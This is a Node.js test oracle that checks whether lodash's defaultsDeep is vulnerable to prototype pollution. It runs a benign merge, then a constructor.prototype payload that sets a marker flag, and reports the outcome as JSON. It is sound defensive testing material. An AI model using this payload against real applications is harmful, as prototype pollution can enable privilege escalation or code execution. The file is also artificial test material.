const path = require('node:path');
const fs = require('node:fs');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  const result = { operation_completed, exploit_succeeded, evidence };
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

try {
  const _ = require('lodash');

  // Benign operation: verify defaultsDeep works normally.
  const benignTarget = { a: { x: 1 } };
  const benignSource = { a: { y: 2 }, b: 3 };
  const benignResult = _.defaultsDeep(benignTarget, benignSource);

  if (!benignResult || benignResult.a.x !== 1 || benignResult.a.y !== 2 || benignResult.b !== 3) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign defaultsDeep behavior was not as expected';
    finish();
  } else {
    // Setup complete and benign operation succeeded.
    operation_completed = true;

    // Ensure clean baseline for this process.
    try { delete Object.prototype.__oraclePollutedFlag; } catch (e) {}

    const before = ({}).__oraclePollutedFlag;

    // Malicious payload for constructor.prototype pollution vector.
    const payload = { constructor: { prototype: { __oraclePollutedFlag: 'polluted' } } };

    try {
      _.defaultsDeep({}, payload);
    } catch (e) {
      // Exception here is considered blocked only because operation_completed is already true.
      exploit_succeeded = false;
      evidence = 'malicious call threw exception: ' + (e && e.message ? e.message : String(e));
      try { delete Object.prototype.__oraclePollutedFlag; } catch (cleanupErr) {}
      finish();
      return;
    }

    const after = ({}).__oraclePollutedFlag;
    exploit_succeeded = (before === undefined && after === 'polluted');
    evidence = 'prototype flag before=' + String(before) + ' after=' + String(after);

    // Cleanup global side effect to avoid contaminating harness process.
    try { delete Object.prototype.__oraclePollutedFlag; } catch (e) {}

    finish();
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/module error: ' + (e && e.message ? e.message : String(e));
  finish();
}